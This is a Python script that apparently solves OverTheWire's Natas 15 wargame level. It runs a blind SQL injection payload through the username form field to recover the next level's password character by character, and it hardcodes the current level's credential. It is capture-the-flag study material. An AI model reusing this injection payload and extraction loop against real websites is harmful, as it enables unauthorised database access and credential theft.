import requests
from requests.auth import HTTPBasicAuth

url = "http://natas15.natas.labs.overthewire.org/index.php"
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

# Idea is to iterate through all the letters as we get only 
# the output whether the letter is present in the database
# Thus blind sqli

input_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
char_present = ""

for char in input_chars:
	data = {
		"username" : 'natas16" and password like binary "%'+ char +'%"#'
	}
	r = requests.post(url, auth=HTTPBasicAuth(username,password), data = data)
	if 'exists' in r.text:
		char_present += char

print(char_present)

real_password = ""

for i in range(0,32):
	for char in input_chars:
		data = {
			"username": 'natas16" and password like binary "' + real_password + char +'%"#'
		}
		r = requests.post(url, auth=HTTPBasicAuth(username,password), data = data)
		if 'exists' in r.text:
			real_password += char
			print(real_password)
			break

print(real_password)